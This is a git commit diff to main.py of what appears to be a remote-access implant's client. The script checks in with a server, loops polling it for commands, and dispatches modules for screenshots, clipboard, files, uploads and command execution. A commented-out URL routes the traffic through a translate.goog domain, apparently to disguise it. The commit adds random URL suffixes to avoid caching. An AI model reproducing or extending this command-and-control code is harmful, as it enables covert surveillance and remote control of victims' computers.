42f629df6fa6b9fa5ae6d41d0c254f586b47555d
Gakamine <jolyantoine@pm.me>
2023-01-27 12:41:01 -0500

    Prevent Google cache

--- main.py
+++ main.py
@@ -1,20 +1,26 @@
 from src import upload,screenshot,clipboard,files,command
+import random, string
 import requests
 import json
 import time
 
 HOSTNAME="USER-PC"
 IP="192.168.1.1"
-BASE_URL = "https://your-domain.translate.goog/"
+# BASE_URL = "https://your-domain.translate.goog/"
+BASE_URL = "http://127.0.0.1:8000/"
+
+def random_string(length):
+	letters=string.ascii_lowercase
+	return ''.join(random.choice(letters) for i in range(length))
 
 ack_url=BASE_URL+HOSTNAME+"/"+IP+"/Status/ON/"
-get_cmd=BASE_URL+"c/"+HOSTNAME+"/"+IP
+get_cmd=BASE_URL+"c/"+HOSTNAME+"/"+IP+"/"
 requests.get(ack_url)
 
 while True:
-    action=json.loads(requests.get(get_cmd).content.decode())["actions"]
-    print(get_cmd)
-    print("action="+str(json.loads(requests.get(get_cmd).content.decode())))
+    url=get_cmd+random_string(24)
+    action=json.loads(requests.get(url).content.decode())["actions"]
+    print(url)
     args=action.split(" ")
     if args[0]=="screenshot":
         (md5,data)=screenshot.take_screenshot()
